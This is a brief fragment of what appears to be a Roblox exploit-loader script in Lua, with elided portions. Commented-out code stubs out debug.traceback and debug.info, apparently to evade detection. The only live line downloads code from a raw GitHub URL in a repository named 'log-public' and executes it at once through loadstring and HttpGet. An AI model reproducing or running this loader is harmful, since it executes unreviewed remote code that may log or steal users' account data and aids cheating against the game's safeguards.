...
--             return "Traceback no blocked";
--         end;
--         debug.info = function()
--             return "Info no blocked";
--         end;
...
--     end
-- end);
local v14 = loadstring(game:HttpGet("https://raw.githubusercontent.com/SkibidiHub111/log-public/refs/heads/main/log"))();
